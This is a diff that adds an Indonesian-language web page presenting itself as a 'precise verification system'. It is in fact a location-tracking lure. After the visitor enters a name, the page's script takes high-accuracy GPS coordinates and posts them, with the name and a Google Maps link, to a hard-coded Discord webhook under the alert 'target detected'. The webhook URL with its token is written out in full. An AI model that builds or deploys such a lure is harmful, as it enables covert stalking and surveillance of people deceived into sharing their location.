@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi Presisi</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { background: #0f0f13; color: #e1e1e1; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #1c1c24; padding: 30px; border-radius: 15px; border: 1px solid #333; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { color: #5865f2; margin-bottom: 10px; }
+        p { font-size: 14px; color: #aaa; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; background: #2a2a35; border: 1px solid #444; border-radius: 8px; color: white; outline: none; transition: 0.3s; }
+        input:focus { border-color: #5865f2; }
+        button { width: 100%; padding: 15px; background: #5865f2; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
+        button:hover { background: #4752c4; transform: translateY(-2px); }
+        .footer { margin-top: 20px; font-size: 10px; color: #555; letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>VERIFIKASI USER</h2>
+    <p>Masukkan Nama untuk sinkronisasi lokasi presisi.</p>
+    
+    <input type="text" id="targetName" placeholder="Nama Lengkap / ID User" required>
+    
+    <button onclick="getUltraLocation()">Mulai Verifikasi</button>
+    
+    <div class="footer">XYREN LAB - ENCRYPTED SYSTEM</div>
+</div>
+
+<script>
+async function getUltraLocation() {
+    const name = document.getElementById('targetName').value;
+    if (!name) {
+        alert("Harap masukkan nama terlebih dahulu!");
+        return;
+    }
+
+    // Settingan High Accuracy untuk akurasi maksimal (GPS Satelit)
+    const options = {
+        enableHighAccuracy: true, 
+        timeout: 15000,           
+        maximumAge: 0             
+    };
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => kirimKeDiscord(pos, name), 
+            handleError, 
+            options
+        );
+    } else {
+        alert("Browser tidak mendukung GPS.");
+    }
+}
+
+async function kirimKeDiscord(pos, name) {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const acc = pos.coords.accuracy.toFixed(2); // Cek seberapa akurat (dalam meter)
+    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+    
+    const webhook = "https://discord.com/api/webhooks/1476556112722530306/IQY3TPNcQyqr-12WSVJj6Y1De1dJWdZxgCprXJjYqtK9v7Sl9K1JEm73HfxMJRdEX6C9";
+
+    const payload = {
+        username: "Xyren Lab Sentinel",
+        content: "🚨 **NOTIFIKASI TARGET TERDETEKSI!**",
+        embeds: [{
+            title: "Data Lokasi Presisi",
+            color: 5763719,
+            fields: [
+                { name: "👤 Identitas User", value: `\`${name}\`` },
+                { name: "📍 Koordinat", value: `\`${lat}, ${lon}\``, inline: true },
+                { name: "🎯 Akurasi Sensor", value: `\`${acc} Meter\``, inline: true },
+                { name: "🗺️ Google Maps Link", value: `[Klik Untuk Navigasi](${mapsUrl})` }
+            ],
+            footer: { text: "Data dikirim secara real-time via GPS Satelit" },
+            timestamp: new Date()
+        }]
+    };
+
+    try {
+        await fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        alert("Verifikasi Berhasil! Silakan tunggu konfirmasi.");
+    } catch (e) {
+        alert("Gagal mengirim data. Cek koneksi internet.");
+    }
+}
+
+function handleError(err) {
+    if (err.code === 1) {
+        alert("Akses GPS Ditolak! Verifikasi tidak dapat dilanjutkan.");
+    } else {
+        alert("Sinyal GPS lemah. Cari tempat terbuka dan coba lagi.");
+    }
+}
+</script>
+
+</body>
+</html>
